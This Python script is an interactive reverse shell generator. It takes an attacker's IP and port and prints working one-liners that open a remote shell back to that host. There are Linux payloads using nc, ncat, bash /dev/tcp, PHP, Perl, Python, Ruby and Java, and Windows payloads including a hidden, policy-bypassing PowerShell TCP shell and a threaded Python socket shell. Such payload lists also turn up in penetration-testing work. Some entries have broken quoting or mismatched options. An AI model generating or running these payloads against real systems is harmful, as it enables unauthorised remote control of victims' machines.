import ipaddress
import atexit

def exit_handler(): 
    print("The application is ending!")

def commands_Linux(x): #List of reverse shell commands for linux 
        switcher={
                1:f"nc.exe {ip} {port} -e sh",
                2:f"ncat.exe {ip} {port} -e sh",
                3:f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
                4:f'php -r "$sock=fsockopen("{ip}",{port});passthru("sh <&3 >&3 2>&3");"',
                5:f'php -r \'$sock=fsockopen(\"{ip}\",{port});exec(\”sh <&3 >&3 2>&3\”);\'',
                6:f'perl -e \'use Socket;$i=\"{ip}\";$p={port};'+'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'',
                7:f'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
                8:f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\'',
                9:java
             }
        return print(switcher.get(x))  

def commands_Windows(x): #List of reverse shell commands for linux 
        switcher={
                1:f"nc {ip} {port} -e sh",
                2:f"ncat {ip} {port} -e sh",
                3:f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'+'{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                4:python
             }
        return print(switcher.get(x))  

print("Welcome to Reverse Shell Generator.")        
exit='c'
while exit=='c':
    while True: #IP adress validation
        ip=input("Enter the IP address which you want to generate reverse shell:\n")
        try:
            ip_object = ipaddress.ip_address(ip)
            print(f"Entered IP address is: {ip} ")
            break
        except:
            print(f"The IP address {ip} is not valid. Please correct the ip adress")

    while True: #Port number validation
        try:
            port=int(input("Please enter the port number:\n"))
            if port>0 and port<65535:
                print(f"Entered port number is :{port} ")
                break
            else:
                print(f"'{port}'' Port number must be between 1 and 65535")
        except:
            print(f"You entered an invalid port number. PLease correct the port number")

    java=("public class shell { \n\t"
        "public static void main(String[] args) {\n\t\t"
        "Process p;\n\t\t"
        "try {\n\t\t\t"
        "p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1\");\n\t\t\t"
        "p.waitFor();\n\t\t\t"
        "p.destroy();\n\t\t\t"
        "} catch (Exception e) \{\}\n\t\t"
        "}\n\t"
        "}")

    python="""
    import os,socket,subprocess,threading;
    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((\""""+str(ip)+"\","+str(port)+"""))
    p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()
    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()
    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()
    """
    while True:
        op_sys=input("Please choose the operation system. Type '1' for Windows and '2' for linux:\n")
        op=op_sys.lower()
        if op=='1': # Selection of operation system
            print("Windows reverse shell generator is running:")
            try:
                i=int(input("Please specify the number:  \n(1)nc -e \n(2)ncat -e \n(3)PowerShell \n(4)Python\n")) #Selection of type
                if i>0 and i<5:
                    commands_Windows(i) 
                    break
                else:
                    print(f"{i} is not available. Enter the a number between 1 and 4 ")
            except:
                print("Input is not valid. ")
        elif op=='2':
            print("Linux reverse shell generator is running:") 
            i=int(input("Please specify the number:  \n(1)nc -e \n(2)ncat -e \n(3)bash -i \n(4)PHP passthru \n(5)PHP exec \n(6)Perl \n(7)Python \n(8)Ruby \n(9)Java \n"))
            commands_Linux(i)
            break 
        else:
            print("Input is not valid. Type 'w' or 'l'.")  
            continue
    #exit the script
    exit=input("Do you want to exit(e) or continue(c) ?\n") 
    if exit=='e':
        atexit.register(exit_handler)
    else :
        None
    
    

